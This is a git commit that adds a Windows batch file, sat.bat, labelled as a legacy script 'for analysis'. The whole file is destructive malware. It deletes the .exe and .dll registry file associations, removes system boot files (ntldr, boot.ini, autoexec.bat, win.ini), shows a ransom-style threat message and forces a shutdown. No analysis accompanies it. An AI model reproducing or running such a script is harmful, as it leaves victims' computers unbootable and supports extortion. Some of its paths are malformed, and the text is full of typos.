a6ac08a585f17684362c4a0bd8d81fcf7973b761
Rohan Das <novahunter@kali.novahunter>
2026-05-18 00:52:52 +0530

    Add legacy Windows XP batch script for analysis

---
+++ sat.bat
@@ -0,0 +1,17 @@
+@echo off
+
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/"
+
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
+@echo off
+msg *you are now under Nova's control ,  either worship him by paying  ransom or get yur pc taken over!!!
+shutdown -s -t 7 -c "Critical a viru is taking over c:drive
